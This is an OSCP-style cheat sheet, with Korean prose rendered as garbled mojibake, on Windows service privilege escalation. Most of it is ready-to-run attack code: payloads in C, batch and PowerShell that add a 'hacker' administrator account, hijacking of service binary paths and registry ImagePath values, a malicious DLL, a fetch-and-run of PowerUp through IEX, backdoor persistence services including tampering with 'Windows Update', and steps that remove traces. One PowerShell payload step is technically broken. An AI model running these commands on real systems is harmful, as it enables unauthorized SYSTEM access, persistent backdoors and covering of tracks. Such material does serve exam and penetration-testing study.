# Windows Service Exploits Privilege Escalation

> **OSCP í•µì‹¬**: Windows ì„œë¹„ìŠ¤ ì·¨ì•½ì ì„ ì•…ìš©í•˜ì—¬ ì¦‰ì‹œ SYSTEM ê¶Œí•œ íšë“í•˜ëŠ” ê²€ì¦ëœ ë°©ë²•ë“¤

## âš¡ ì¦‰ì‹œ ì‹¤í–‰í•  ëª…ë ¹ì–´ë“¤

### ğŸ” Unquoted Service Path ì°¾ê¸° (30ì´ˆ ì•ˆì—)

```cmd
:: ê°€ì¥ ì¤‘ìš”í•œ ì·¨ì•½ì  - Unquoted Service Path
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

:: ë” ìƒì„¸í•œ ê²€ìƒ‰
for /f "tokens=2" %n in ('sc query state^= all ^| findstr SERVICE_NAME') do @echo %n & @sc qc %n | findstr BINARY_PATH_NAME | findstr /v """

:: PowerShell ë²„ì „
powershell "Get-WmiObject -Class Win32_Service | Where-Object {$_.StartMode -eq 'Auto' -and $_.PathName -notlike '*\Windows\*' -and $_.PathName -notlike '`"*'} | Select-Object Name, DisplayName, PathName"
```

### ğŸ¯ ì„œë¹„ìŠ¤ ê¶Œí•œ í™•ì¸ (ì¦‰ì‹œ)

```cmd
:: ëª¨ë“  ì„œë¹„ìŠ¤ì˜ ê¶Œí•œ í™•ì¸ (accesschk í•„ìš”)
accesschk.exe -uwcqv "Authenticated Users" * 2>nul
accesschk.exe -uwcqv "Everyone" * 2>nul
accesschk.exe -uwcqv %USERNAME% * 2>nul

:: íŠ¹ì • ì„œë¹„ìŠ¤ ê¶Œí•œ í™•ì¸
sc sdshow ServiceName
sc qc ServiceName

:: ì„œë¹„ìŠ¤ ì‹¤í–‰ íŒŒì¼ ê¶Œí•œ í™•ì¸
icacls "C:\Path\To\Service.exe"
```

### âš¡ ì„œë¹„ìŠ¤ ì •ë³´ ìˆ˜ì§‘

```cmd
:: ì‹¤í–‰ ì¤‘ì¸ ì„œë¹„ìŠ¤ë“¤
sc query state= all | findstr "SERVICE_NAME\|STATE"
net start

:: ì„œë¹„ìŠ¤ ìƒì„¸ ì •ë³´
wmic service get name,displayname,pathname,startmode,state,startname | findstr /i "running\|auto"

:: ì„œë¹„ìŠ¤ ì‹œì‘ ëª¨ë“œ
sc query type= service state= all | findstr "SERVICE_NAME\|START_TYPE"
```

## ğŸ“‹ ë‹¨ê³„ë³„ ì²´í¬ë¦¬ìŠ¤íŠ¸

### Phase 1: ì„œë¹„ìŠ¤ ë°œê²¬ ë° ë¶„ë¥˜ (2ë¶„)

- [ ] **Unquoted Service Path**: ê³µë°±ì´ í¬í•¨ëœ ê²½ë¡œì— ë”°ì˜´í‘œ ì—†ëŠ” ì„œë¹„ìŠ¤
- [ ] **Service Permissions**: ì„œë¹„ìŠ¤ ì„¤ì •ì„ ìˆ˜ì •í•  ìˆ˜ ìˆëŠ” ê¶Œí•œ
- [ ] **Binary Permissions**: ì„œë¹„ìŠ¤ ì‹¤í–‰ íŒŒì¼ì„ ìˆ˜ì •í•  ìˆ˜ ìˆëŠ” ê¶Œí•œ
- [ ] **Service Registry**: ì„œë¹„ìŠ¤ ë ˆì§€ìŠ¤íŠ¸ë¦¬ í‚¤ ìˆ˜ì • ê¶Œí•œ
- [ ] **DLL Hijacking**: ì„œë¹„ìŠ¤ê°€ ë¡œë“œí•˜ëŠ” DLL í•˜ì´ì¬í‚¹ ê°€ëŠ¥ì„±

### Phase 2: ê¶Œí•œ ë¶„ì„ (3ë¶„)

- [ ] **Write ê¶Œí•œ**: ì„œë¹„ìŠ¤ë‚˜ ì‹¤í–‰ íŒŒì¼ì— ì“°ê¸° ê¶Œí•œ í™•ì¸
- [ ] **Modify ê¶Œí•œ**: ì„œë¹„ìŠ¤ ì„¤ì • ë³€ê²½ ê¶Œí•œ í™•ì¸
- [ ] **Full Control**: ì„œë¹„ìŠ¤ì— ëŒ€í•œ ì™„ì „í•œ ì œì–´ ê¶Œí•œ
- [ ] **Registry ê¶Œí•œ**: ì„œë¹„ìŠ¤ ë ˆì§€ìŠ¤íŠ¸ë¦¬ í‚¤ ì ‘ê·¼ ê¶Œí•œ
- [ ] **Directory ê¶Œí•œ**: ì„œë¹„ìŠ¤ ì‹¤í–‰ íŒŒì¼ ë””ë ‰í† ë¦¬ ê¶Œí•œ

### Phase 3: ìµìŠ¤í”Œë¡œì‡ ê°€ëŠ¥ì„± í™•ì¸ (2ë¶„)

- [ ] **Restart ê¶Œí•œ**: ì„œë¹„ìŠ¤ë¥¼ ì¬ì‹œì‘í•  ìˆ˜ ìˆëŠ”ì§€ í™•ì¸
- [ ] **Start/Stop ê¶Œí•œ**: ì„œë¹„ìŠ¤ ì œì–´ ê¶Œí•œ í™•ì¸
- [ ] **íŒŒì¼ êµì²´ ê°€ëŠ¥**: ì‹¤í–‰ íŒŒì¼ì´ë‚˜ DLL êµì²´ ê°€ëŠ¥í•œì§€
- [ ] **ê²½ë¡œ ì£¼ì… ê°€ëŠ¥**: Unquoted pathì—ì„œ ì•…ì„± ì‹¤í–‰ íŒŒì¼ ì£¼ì…
- [ ] **ê¶Œí•œ ìƒìŠ¹ í›„ ì‹¤í–‰**: ì„œë¹„ìŠ¤ê°€ SYSTEM ê¶Œí•œìœ¼ë¡œ ì‹¤í–‰ë˜ëŠ”ì§€

## ğŸ¯ ë°œê²¬ë³„ ì¦‰ì‹œ ìµìŠ¤í”Œë¡œì‡

### ğŸš¨ Unquoted Service Path ìµìŠ¤í”Œë¡œì‡

```cmd
:: 1. ì·¨ì•½í•œ ì„œë¹„ìŠ¤ í™•ì¸ (ì˜ˆ: C:\Program Files\Some Service\service.exe)
sc qc VulnerableService

:: 2. ê²½ë¡œ ë¶„ì„ - ì£¼ì… ê°€ëŠ¥í•œ ìœ„ì¹˜ í™•ì¸
:: C:\Program Files\Some Service\service.exe
:: ì‹œë„ ìˆœì„œ: C:\Program.exe -> C:\Program Files\Some.exe

:: 3. ë””ë ‰í† ë¦¬ ì“°ê¸° ê¶Œí•œ í™•ì¸
icacls "C:\"
icacls "C:\Program Files\"

:: 4. ì•…ì„± ì‹¤í–‰ íŒŒì¼ ìƒì„± (Cë¡œ ì»´íŒŒì¼)
echo #include ^<windows.h^> > evil.c
echo #include ^<stdio.h^> >> evil.c
echo int main() { >> evil.c
echo     system("net user hacker password123 /add"); >> evil.c
echo     system("net localgroup administrators hacker /add"); >> evil.c
echo     return 0; >> evil.c
echo } >> evil.c

:: 5. ì»´íŒŒì¼ (gcc ìˆëŠ” ê²½ìš°)
gcc evil.c -o Program.exe

:: 6. íŒŒì¼ ë°°ì¹˜
copy Program.exe "C:\Program.exe"

:: 7. ì„œë¹„ìŠ¤ ì¬ì‹œì‘
sc stop VulnerableService
sc start VulnerableService

:: ë˜ëŠ” ì‹œìŠ¤í…œ ì¬ë¶€íŒ… ê¸°ë‹¤ë¦¬ê¸°
```

```powershell
# PowerShellë¡œ Unquoted Service Path ìµìŠ¤í”Œë¡œì‡
# 1. ì·¨ì•½í•œ ì„œë¹„ìŠ¤ ì°¾ê¸°
Get-WmiObject win32_service | Where-Object {$_.StartMode -eq "Auto" -and $_.PathName -notlike "`"*" -and $_.PathName -like "* *"} | Select-Object Name, PathName

# 2. ì•…ì„± ì‹¤í–‰ íŒŒì¼ ìƒì„± (PowerShell)
$payload = @'
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
public class Program {
    public static void Main() {
        Process.Start("cmd.exe", "/c net user hacker password123 /add & net localgroup administrators hacker /add");
    }
}
"@
[Program]::Main()
'@

# 3. ì‹¤í–‰ íŒŒì¼ë¡œ ì €ì¥
$payload | Out-File -FilePath C:\Program.exe -Encoding ASCII

# 4. ì„œë¹„ìŠ¤ ì¬ì‹œì‘
Restart-Service VulnerableService
```

### ğŸ”§ Service Permissions ìµìŠ¤í”Œë¡œì‡

```cmd
:: 1. ì„œë¹„ìŠ¤ ê¶Œí•œ í™•ì¸
accesschk.exe -uwcqv %USERNAME% VulnerableService

:: 2. ì„œë¹„ìŠ¤ ì„¤ì • ë³€ê²½ ê¶Œí•œì´ ìˆëŠ” ê²½ìš°
:: ì„œë¹„ìŠ¤ ì‹¤í–‰ íŒŒì¼ ê²½ë¡œë¥¼ ì•…ì„± íŒŒì¼ë¡œ ë³€ê²½

:: 3. ì•…ì„± ì‹¤í–‰ íŒŒì¼ ìƒì„±
echo net user hacker password123 /add > C:\Windows\Temp\evil.bat
echo net localgroup administrators hacker /add >> C:\Windows\Temp\evil.bat

:: 4. ì„œë¹„ìŠ¤ ì„¤ì • ë³€ê²½
sc config VulnerableService binpath= "C:\Windows\Temp\evil.bat"

:: 5. ì„œë¹„ìŠ¤ ì¬ì‹œì‘
sc stop VulnerableService
sc start VulnerableService

:: 6. ì›ë˜ ì„¤ì •ìœ¼ë¡œ ë³µêµ¬ (í”ì  ì œê±°)
sc config VulnerableService binpath= "ì›ë˜ê²½ë¡œ"
```

### ğŸ“ Service Binary Permissions ìµìŠ¤í”Œë¡œì‡

```cmd
:: 1. ì„œë¹„ìŠ¤ ì‹¤í–‰ íŒŒì¼ ê¶Œí•œ í™•ì¸
sc qc VulnerableService
icacls "C:\Path\To\Service.exe"

:: 2. ì“°ê¸° ê¶Œí•œì´ ìˆëŠ” ê²½ìš° ë°±ì—… ìƒì„±
copy "C:\Path\To\Service.exe" "C:\Path\To\Service.exe.bak"

:: 3. ì•…ì„± ì‹¤í–‰ íŒŒì¼ë¡œ êµì²´
copy evil.exe "C:\Path\To\Service.exe"

:: 4. ì„œë¹„ìŠ¤ ì¬ì‹œì‘
sc stop VulnerableService
sc start VulnerableService

:: 5. ì›ë³¸ íŒŒì¼ ë³µêµ¬
copy "C:\Path\To\Service.exe.bak" "C:\Path\To\Service.exe"
```

### ğŸ—ï¸ Service Registry ìµìŠ¤í”Œë¡œì‡

```cmd
:: 1. ì„œë¹„ìŠ¤ ë ˆì§€ìŠ¤íŠ¸ë¦¬ í‚¤ ê¶Œí•œ í™•ì¸
accesschk.exe -kwsu %USERNAME% HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services

:: 2. íŠ¹ì • ì„œë¹„ìŠ¤ ë ˆì§€ìŠ¤íŠ¸ë¦¬ ê¶Œí•œ í™•ì¸
accesschk.exe -kwsu %USERNAME% HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\VulnerableService

:: 3. ë ˆì§€ìŠ¤íŠ¸ë¦¬ì—ì„œ ì„œë¹„ìŠ¤ ê²½ë¡œ ë³€ê²½
reg add "HKLM\SYSTEM\CurrentControlSet\Services\VulnerableService" /v ImagePath /t REG_EXPAND_SZ /d "C:\Windows\Temp\evil.exe" /f

:: 4. ì„œë¹„ìŠ¤ ì¬ì‹œì‘
sc stop VulnerableService
sc start VulnerableService
```

### ğŸ“š DLL Hijacking ìµìŠ¤í”Œë¡œì‡

```cmd
:: 1. ì„œë¹„ìŠ¤ê°€ ë¡œë“œí•˜ëŠ” DLL í™•ì¸
:: Process Monitorë‚˜ Dependency Walker ì‚¬ìš©
:: ë˜ëŠ” ì„œë¹„ìŠ¤ ì‹¤í–‰ íŒŒì¼ ë¶„ì„

:: 2. ì°¾ì„ ìˆ˜ ì—†ëŠ” DLLì´ë‚˜ ìƒëŒ€ ê²½ë¡œë¡œ ë¡œë“œë˜ëŠ” DLL í™•ì¸
:: ì¼ë°˜ì ì¸ í›„ë³´: version.dll, dwmapi.dll, comctl32.dll

:: 3. ì•…ì„± DLL ìƒì„± (C++)
#include <windows.h>
BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("net user hacker password123 /add & net localgroup administrators hacker /add");
    }
    return TRUE;
}

:: 4. DLL ì»´íŒŒì¼
gcc -shared -o hijack.dll dllmain.c -Wl,--out-implib,hijack.lib

:: 5. DLLì„ ì„œë¹„ìŠ¤ ë””ë ‰í† ë¦¬ì— ë°°ì¹˜
copy hijack.dll "C:\Path\To\Service\Directory\missing.dll"

:: 6. ì„œë¹„ìŠ¤ ì¬ì‹œì‘
sc stop VulnerableService
sc start VulnerableService
```

## ğŸ¤– ìë™í™” ë„êµ¬ í™œìš©

### ğŸ” PowerUp ì„œë¹„ìŠ¤ ìŠ¤ìº”

```powershell
# PowerUp ë‹¤ìš´ë¡œë“œ ë° ì‹¤í–‰
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')

# ëª¨ë“  ì„œë¹„ìŠ¤ ì·¨ì•½ì  ê²€ì‚¬
Invoke-AllChecks

# ê°œë³„ ì„œë¹„ìŠ¤ ê²€ì‚¬
Get-UnquotedService
Get-ModifiableService
Get-ModifiableServiceFile
Get-ServiceUnquoted

# ì„œë¹„ìŠ¤ ìµìŠ¤í”Œë¡œì‡ ì‹¤í–‰
Invoke-ServiceAbuse -ServiceName VulnerableService -Command "net user hacker password123 /add"
```

### ğŸ¯ WinPEAS ì„œë¹„ìŠ¤ ë¶„ì„

```cmd
:: WinPEAS ì„œë¹„ìŠ¤ ê´€ë ¨ ì •ë³´ë§Œ ì¶”ì¶œ
winPEAS.exe servicesinfo

:: ê²°ê³¼ì—ì„œ ì„œë¹„ìŠ¤ ì·¨ì•½ì ë§Œ í•„í„°ë§
winPEAS.exe | findstr /i "Unquoted\|Modifiable\|WritePermissions"
```

### ğŸ”§ AccessChk ì„œë¹„ìŠ¤ ê¶Œí•œ ë¶„ì„

```cmd
:: accesschk ë‹¤ìš´ë¡œë“œ (Sysinternals)
:: https://download.sysinternals.com/files/AccessChk.zip

:: í˜„ì¬ ì‚¬ìš©ìì˜ ì„œë¹„ìŠ¤ ê¶Œí•œ í™•ì¸
accesschk.exe -uwcqv %USERNAME% * 2>nul | findstr "RW\|SERVICE_ALL_ACCESS\|SERVICE_CHANGE_CONFIG"

:: Everyone ê·¸ë£¹ì˜ ì„œë¹„ìŠ¤ ê¶Œí•œ
accesschk.exe -uwcqv "Everyone" * 2>nul

:: Authenticated Users ê·¸ë£¹ì˜ ì„œë¹„ìŠ¤ ê¶Œí•œ
accesschk.exe -uwcqv "Authenticated Users" * 2>nul

:: íŠ¹ì • ì„œë¹„ìŠ¤ ìƒì„¸ ê¶Œí•œ
accesschk.exe -cv ServiceName
```

### ğŸ•µï¸ ì„œë¹„ìŠ¤ ìµìŠ¤í”Œë¡œì‡ ìë™í™” ìŠ¤í¬ë¦½íŠ¸

```cmd
:: ì¢…í•© ì„œë¹„ìŠ¤ ì·¨ì•½ì  ìŠ¤ìº” ìŠ¤í¬ë¦½íŠ¸ (ë³µë¶™ìš©)
@echo off
echo ===== WINDOWS SERVICE EXPLOITATION SCAN =====
echo.

echo [+] Scanning for Unquoted Service Paths...
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
echo.

echo [+] Checking service permissions with current user...
if exist accesschk.exe (
    accesschk.exe -uwcqv %USERNAME% * 2>nul | findstr "RW\|SERVICE_ALL_ACCESS"
) else (
    echo AccessChk not found. Download from: https://download.sysinternals.com/files/AccessChk.zip
)
echo.

echo [+] Checking modifiable service binaries...
for /f "tokens=2*" %%i in ('sc query state^= all ^| findstr "SERVICE_NAME"') do (
    for /f "tokens=3*" %%k in ('sc qc %%j ^| findstr "BINARY_PATH_NAME"') do (
        icacls %%k 2>nul | findstr /i "%USERNAME%\|Everyone\|Users" >nul && echo Modifiable: %%j - %%k
    )
)
echo.

echo [+] Checking for services running as SYSTEM...
wmic service where "startname='LocalSystem'" get name,displayname,pathname,startmode
echo.

echo ===== SCAN COMPLETE =====
```

```powershell
# PowerShell ì„œë¹„ìŠ¤ ì·¨ì•½ì  ìŠ¤ìº” ìŠ¤í¬ë¦½íŠ¸ (ë³µë¶™ìš©)
Write-Host "===== WINDOWS SERVICE EXPLOITATION SCAN =====" -ForegroundColor Green

Write-Host "`n[+] Scanning for Unquoted Service Paths..." -ForegroundColor Yellow
Get-WmiObject win32_service | Where-Object {$_.StartMode -eq "Auto" -and $_.PathName -notlike "`"*" -and $_.PathName -like "* *"} | Select-Object Name, DisplayName, PathName

Write-Host "`n[+] Checking for modifiable services..." -ForegroundColor Yellow
Get-WmiObject win32_service | ForEach-Object {
    $servicePath = $_.PathName -replace '"', '' -replace ' /.*', ''
    if (Test-Path $servicePath -ErrorAction SilentlyContinue) {
        try {
            $acl = Get-Acl $servicePath -ErrorAction Stop
            if ($acl.AccessToString -match $env:USERNAME -or $acl.AccessToString -match "Everyone" -or $acl.AccessToString -match "Users") {
                Write-Host "Modifiable service: $($_.Name) - $servicePath" -ForegroundColor Red
            }
        } catch {}
    }
}

Write-Host "`n[+] Services running as SYSTEM..." -ForegroundColor Yellow
Get-WmiObject win32_service | Where-Object {$_.StartName -eq "LocalSystem"} | Select-Object Name, DisplayName, PathName, State

Write-Host "`n===== SCAN COMPLETE =====" -ForegroundColor Green
```

## ğŸ‘€ ë†“ì¹˜ê¸° ì‰¬ìš´ ê²ƒë“¤

### ğŸš¨ ê³ ê¸‰ ì„œë¹„ìŠ¤ ìµìŠ¤í”Œë¡œì‡ ê¸°ë²•

```cmd
:: 1. ì„œë¹„ìŠ¤ dependency ì•…ìš©
:: ì¢…ì† ì„œë¹„ìŠ¤ë¥¼ í†µí•œ ê°„ì ‘ ê³µê²©
sc enumdepend VulnerableService
sc qc DependentService

:: 2. ì„œë¹„ìŠ¤ ê³„ì • ê¶Œí•œ í™•ì¸
:: ì„œë¹„ìŠ¤ê°€ ë‹¤ë¥¸ ê³„ì •ìœ¼ë¡œ ì‹¤í–‰ë˜ëŠ” ê²½ìš°
wmic service get name,startname | findstr /v "LocalSystem\|NT AUTHORITY"

:: 3. ì„œë¹„ìŠ¤ ë¡œê·¸ì˜¨ ê¶Œí•œ (SeServiceLogonRight)
whoami /priv | findstr "SeServiceLogonRight"

:: 4. ì„œë¹„ìŠ¤ ìƒì„± ê¶Œí•œ (Create Service)
accesschk.exe -uwcqv %USERNAME% "NT SERVICE\TrustedInstaller"

:: 5. ì„œë¹„ìŠ¤ ì„¤ì¹˜ íŒŒì¼ ê¶Œí•œ
:: MSI ì„¤ì¹˜ íŒŒì¼ì´ë‚˜ ì„œë¹„ìŠ¤ ì„¤ì¹˜ ìŠ¤í¬ë¦½íŠ¸
dir /b /s C:\ | findstr /i "setup\|install" | findstr "\.exe$\|\.msi$"

:: 6. ì„ì‹œ ì„œë¹„ìŠ¤ ìƒì„±
:: ê´€ë¦¬ì ê¶Œí•œì´ ìˆëŠ” ê²½ìš° ì„ì‹œ ì„œë¹„ìŠ¤ ìƒì„±
sc create TempService binpath= "C:\Windows\Temp\evil.exe"
sc start TempService
sc delete TempService

:: 7. ì„œë¹„ìŠ¤ í˜¸ìŠ¤íŠ¸ í”„ë¡œì„¸ìŠ¤ (svchost.exe)
:: ì—¬ëŸ¬ ì„œë¹„ìŠ¤ë¥¼ í˜¸ìŠ¤íŒ…í•˜ëŠ” svchost í”„ë¡œì„¸ìŠ¤ ë¶„ì„
tasklist /svc | findstr svchost
```

### ğŸ” DLL Hijacking ê³ ê¸‰ ê¸°ë²•

```cmd
:: 1. WinSxS ë””ë ‰í† ë¦¬ DLL í•˜ì´ì¬í‚¹
dir /b /s C:\Windows\WinSxS | findstr "\.dll$" | findstr version

:: 2. System32 DLL í”„ë¡ì‹œ
:: ì •ìƒ DLLì„ í”„ë¡ì‹œí•˜ë©´ì„œ ì•…ì„± ì½”ë“œ ì‹¤í–‰
:: dllmain.c ì˜ˆì œ:
/*
#include <windows.h>
HMODULE hMod;
BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        hMod = LoadLibrary(L"C:\\Windows\\System32\\version_orig.dll");
        system("net user hacker password123 /add");
    }
    return TRUE;
}
// ì›ë³¸ DLL í•¨ìˆ˜ë“¤ì„ í”„ë¡ì‹œ
*/

:: 3. COM í•˜ì´ì¬í‚¹
:: COM ê°ì²´ ë“±ë¡ì„ í†µí•œ DLL í•˜ì´ì¬í‚¹
reg query HKEY_CURRENT_USER\Software\Classes\CLSID
reg query HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID

:: 4. AppInit_DLLs ë ˆì§€ìŠ¤íŠ¸ë¦¬
:: ëª¨ë“  í”„ë¡œì„¸ìŠ¤ì— DLL ì£¼ì…
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs

:: 5. í™˜ê²½ ë³€ìˆ˜ PATH DLL í•˜ì´ì¬í‚¹
:: PATH í™˜ê²½ ë³€ìˆ˜ì˜ ì²« ë²ˆì§¸ ë””ë ‰í† ë¦¬ì— ì•…ì„± DLL ë°°ì¹˜
echo %PATH%
```

### âš¡ ì„œë¹„ìŠ¤ ì¬ì‹œì‘ ì—†ì´ ìµìŠ¤í”Œë¡œì‡

```cmd
:: 1. ì„œë¹„ìŠ¤ ì¤‘ì§€ ì—†ì´ ì‹¤í–‰ íŒŒì¼ êµì²´
:: íŒŒì¼ì´ ì‚¬ìš© ì¤‘ì¼ ë•Œ êµì²´ ë°©ë²•

:: 2. ì‹¬ë³¼ë¦­ ë§í¬ ê³µê²©
mklink /H evil.exe "C:\Path\To\Service.exe"

:: 3. Junction Point ê³µê²©
mklink /J "C:\Program Files\Vulnerable" "C:\Windows\Temp"

:: 4. í•˜ë“œë§í¬ ê³µê²©
fsutil hardlink create "C:\Windows\Temp\service.exe" "C:\Path\To\Original\Service.exe"

:: 5. ë ˆì§€ìŠ¤íŠ¸ë¦¬ ì§ì ‘ ìˆ˜ì • (ì¬ë¶€íŒ… í›„ ì ìš©)
reg add "HKLM\SYSTEM\CurrentControlSet\Services\VulnerableService" /v ImagePath /d "C:\Windows\Temp\evil.exe" /f

:: 6. ìŠ¤ì¼€ì¤„ëœ ì‘ì—…ì„ í†µí•œ ìš°íšŒ
schtasks /create /tn "ServiceRestart" /tr "sc stop VulnerableService & copy evil.exe service.exe & sc start VulnerableService" /sc onstart /ru system

:: 7. WMI ì´ë²¤íŠ¸ë¥¼ í†µí•œ ìë™ ì‹¤í–‰
:: ì„œë¹„ìŠ¤ ìƒíƒœ ë³€í™”ë¥¼ ëª¨ë‹ˆí„°ë§í•˜ì—¬ ìë™ ìµìŠ¤í”Œë¡œì‡
```

### ğŸ”§ ê¶Œí•œ í™•ì¸ ìš°íšŒ ê¸°ë²•

```cmd
:: 1. ë‹¤ë¥¸ ì‚¬ìš©ì ì»¨í…ìŠ¤íŠ¸ì—ì„œ ê¶Œí•œ í™•ì¸
runas /user:Administrator "accesschk.exe -uwcqv %USERNAME% *"

:: 2. PowerShell ì‹¤í–‰ ì •ì±… ìš°íšŒ
powershell -ExecutionPolicy Bypass -Command "Get-Service"

:: 3. WMICì„ í†µí•œ ì„œë¹„ìŠ¤ ì •ë³´ ìˆ˜ì§‘
wmic service where "name='VulnerableService'" get *

:: 4. ë ˆì§€ìŠ¤íŠ¸ë¦¬ ì§ì ‘ ì ‘ê·¼
reg query "HKLM\SYSTEM\CurrentControlSet\Services\VulnerableService"

:: 5. í”„ë¡œì„¸ìŠ¤ ë¤í”„ë¥¼ í†µí•œ ì •ë³´ íšë“
tasklist /m | findstr "VulnerableService"

:: 6. ì´ë²¤íŠ¸ ë¡œê·¸ì—ì„œ ì„œë¹„ìŠ¤ ì •ë³´
wevtutil qe System /q:"*[System[Provider[@Name='Service Control Manager']]]" /f:text

:: 7. ë„¤íŠ¸ì›Œí¬ë¥¼ í†µí•œ ì›ê²© ì„œë¹„ìŠ¤ ì—´ê±° (ë„ë©”ì¸ í™˜ê²½)
sc \\target-machine query
```

### ğŸ’¡ ì„œë¹„ìŠ¤ ì§€ì†ì„± í™•ë³´

```cmd
:: 1. ìƒˆë¡œìš´ ì„œë¹„ìŠ¤ ìƒì„± (ë°±ë„ì–´)
sc create BackdoorService binpath= "C:\Windows\Temp\backdoor.exe" start= auto
sc description BackdoorService "Windows System Service"

:: 2. ê¸°ì¡´ ì„œë¹„ìŠ¤ ìˆ˜ì • (ì€ë‹‰)
sc config "Windows Update" binpath= "C:\Windows\System32\svchost.exe -k netsvcs -p & C:\Windows\Temp\backdoor.exe"

:: 3. ì„œë¹„ìŠ¤ DLL êµì²´ (ì§€ì†ì„±)
:: svchostê°€ í˜¸ìŠ¤íŒ…í•˜ëŠ” ì„œë¹„ìŠ¤ì˜ DLL êµì²´
reg query "HKLM\SYSTEM\CurrentControlSet\Services\ServiceName\Parameters" /v ServiceDll

:: 4. ì˜ì¡´ì„± ì„œë¹„ìŠ¤ ìƒì„±
sc create DependencyService binpath= "C:\Windows\Temp\backdoor.exe"
sc config MainService depend= DependencyService

:: 5. ì„œë¹„ìŠ¤ ë³µêµ¬ ì„¤ì • ì•…ìš©
sc failure VulnerableService reset= 86400 actions= run/60000/run/60000/run/60000
sc failureflag VulnerableService 1
sc failure VulnerableService command= "C:\Windows\Temp\backdoor.exe"
```

## ğŸš¨ ì¤‘ìš” ì°¸ê³ ì‚¬í•­

### â° ì‹œê°„ ê´€ë¦¬

- **ì²˜ìŒ 2ë¶„**: Unquoted service pathì™€ ê¸°ë³¸ ì„œë¹„ìŠ¤ ê¶Œí•œ í™•ì¸
- **ë‹¤ìŒ 3ë¶„**: accesschkìœ¼ë¡œ ìƒì„¸ ê¶Œí•œ ë¶„ì„ ë° PowerUp ì‹¤í–‰
- **ì¶”ê°€ 2ë¶„**: ë°œê²¬ëœ ì·¨ì•½ì ì— ëŒ€í•œ ìµìŠ¤í”Œë¡œì‡ ì‹œë„
- **7ë¶„ í›„**: ì„œë¹„ìŠ¤ ì¬ì‹œì‘ì´ í•„ìš”í•œ ìµìŠ¤í”Œë¡œì‡ì€ ì‹œê°„ ê³ ë ¤

### ğŸ¯ ì„±ê³µë¥  ë†’ì€ ìˆœì„œ

1. **Unquoted Service Path**: ê°€ì¥ í”í•˜ê³  í™•ì‹¤í•œ Windows privesc
2. **Service Binary Permissions**: ì‹¤í–‰ íŒŒì¼ êµì²´ ê°€ëŠ¥ì‹œ ê±°ì˜ í™•ì‹¤
3. **Service Permissions**: ì„œë¹„ìŠ¤ ì„¤ì • ë³€ê²½ ê¶Œí•œ ìˆì„ ë•Œ
4. **DLL Hijacking**: ê³ ê¸‰ ê¸°ë²•ì´ì§€ë§Œ íƒì§€ ì–´ë ¤ì›€
5. **Registry Permissions**: ë ˆì§€ìŠ¤íŠ¸ë¦¬ ìˆ˜ì • ê¶Œí•œ ìˆì„ ë•Œ

### ğŸ”¥ ì¦‰ì‹œ ì‹œë„í•  ê²ƒë“¤

- Unquoted service pathëŠ” Windowsì—ì„œ ê°€ì¥ í”í•œ ë²¡í„°
- accesschk.exe ë‹¤ìš´ë¡œë“œ í›„ ì¦‰ì‹œ ê¶Œí•œ ë¶„ì„
- PowerUp ì‹¤í–‰ê³¼ ë™ì‹œì— ìˆ˜ë™ í™•ì¸ ë³‘í–‰
- ì„œë¹„ìŠ¤ ì¬ì‹œì‘ ê¶Œí•œ ì—†ìœ¼ë©´ ì¬ë¶€íŒ… ëŒ€ê¸° ê³ ë ¤

### ğŸ’¡ íŒ

- ì„œë¹„ìŠ¤ ìµìŠ¤í”Œë¡œì‡ì€ Windowsì—ì„œ ê°€ì¥ íš¨ê³¼ì ì¸ privesc ë°©ë²•
- accesschk.exeëŠ” í•„ìˆ˜ ë„êµ¬ (Sysinternalsì—ì„œ ë‹¤ìš´ë¡œë“œ)
- ì„œë¹„ìŠ¤ ì¬ì‹œì‘ì´ í•„ìš”í•œ ê²½ìš°ê°€ ë§ìœ¼ë¯€ë¡œ ì‹œê°„ ê³ ë ¤
- ì„±ê³µ í›„ ì§€ì†ì„± í™•ë³´ë¥¼ ìœ„í•´ ìƒˆ ê´€ë¦¬ì ê³„ì • ìƒì„±
- í”ì  ì œê±°ë¥¼ ìœ„í•´ ì›ë³¸ íŒŒì¼ ë³µêµ¬ë‚˜ ì„¤ì • ë˜ëŒë¦¬ê¸°
